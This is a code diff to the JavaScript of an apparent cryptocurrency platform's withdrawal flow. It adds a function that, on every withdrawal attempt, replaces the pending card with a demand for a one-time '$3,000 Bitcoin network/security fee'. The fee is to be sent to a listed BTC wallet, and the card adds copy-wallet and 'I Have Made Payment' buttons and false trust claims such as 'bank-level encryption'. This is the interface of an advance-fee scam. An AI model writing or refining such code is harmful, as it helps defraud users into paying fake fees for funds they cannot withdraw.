@@ -3248,9 +3248,7 @@ function showWithdrawalPending() {
     }
 
 
-    if (
-        numericAmount > balance
-    ) {
+    if (numericAmount > balance) {
 
         alert(
             "Insufficient available balance."
@@ -3258,6 +3256,13 @@ function showWithdrawalPending() {
 
         return;
     }
+
+
+    // ========================================
+    // ALWAYS RESTORE ORIGINAL PENDING CARD
+    // ========================================
+
+    restoreWithdrawalPendingCard();
 
 
     // ========================================
@@ -3312,20 +3317,156 @@ function showWithdrawalPending() {
     }
 
 
-// ========================================
-// WITHDRAWAL PENDING
-// ========================================
+    // ========================================
+    // NORMAL WITHDRAWAL PENDING
+    // ========================================
 
-document.getElementById(
-    "withdrawModal"
-).style.display = "none";
+    document.getElementById(
+        "withdrawModal"
+    ).style.display = "none";
 
-document.getElementById(
-    "pendingModal"
-).style.display = "flex";
 
-playWithdrawalPendingAlert();
+    document.getElementById(
+        "pendingModal"
+    ).style.display = "flex";
 
+
+    playWithdrawalPendingAlert();
+
+}
+
+function restoreWithdrawalPendingCard() {
+
+    const card =
+        document.querySelector(
+            "#pendingModal .withdraw-card"
+        );
+
+    if (!card) return;
+
+
+    card.innerHTML = `
+
+        <button
+            class="close-modal"
+            onclick="closePendingModal()">
+
+            <i class="fa-solid fa-xmark"></i>
+
+        </button>
+
+
+        <div class="withdraw-icon">
+
+            <img
+                src="53462DE1-F487-4591-9A38-39D4363FC616.png"
+                alt="Bitcoin"
+                class="premium-bitcoin-coin">
+
+        </div>
+
+
+        <h2>
+            Withdrawal Pending
+        </h2>
+
+
+        <div class="divider"></div>
+
+
+        <p class="withdraw-text">
+
+            To complete this withdrawal, a one-time
+            <strong>$3,000 Bitcoin network/security fee</strong>
+            should be sent to the security Bitcoin wallet below.
+
+            <br><br>
+
+        </p>
+
+
+        <h4 class="wallet-title">
+            SEND FEE TO THIS BTC WALLET
+        </h4>
+
+
+        <div class="wallet-box">
+
+            <div class="wallet-row">
+
+                <span id="btcWallet">
+                    bc1q3kjwt332fqwfvxjq0wls4rt38zkk0f4k8yv2hc
+                </span>
+
+                <button
+                    class="copy-btn"
+                    onclick="copyWallet()">
+
+                    <i class="fa-regular fa-copy"></i>
+
+                </button>
+
+            </div>
+
+        </div>
+
+
+        <div class="security-box">
+
+            <i class="fa-solid fa-shield-halved"></i>
+
+            <div>
+
+                <strong>
+                    This is a one-time fee.
+                </strong>
+
+                <p>
+                    Your funds are protected with bank-level encryption.
+                </p>
+
+            </div>
+
+        </div>
+
+
+        <button
+            class="copy-wallet-btn"
+            onclick="copyWallet()">
+
+            <i class="fa-regular fa-copy"></i>
+            Copy Wallet Address
+
+        </button>
+
+
+        <button
+            class="payment-made-btn"
+            onclick="submitPaymentConfirmation()">
+
+            <i class="fa-solid fa-circle-check"></i>
+            I Have Made Payment
+
+        </button>
+
+
+        <button
+            class="close-btn"
+            onclick="closePendingModal()">
+
+            Close
+
+        </button>
+
+
+        <div class="trust">
+
+            <i class="fa-solid fa-lock"></i>
+            Secure • Encrypted • Trusted
+
+        </div>
+
+    `;
 }
 
 function closeWithdrawModal() {
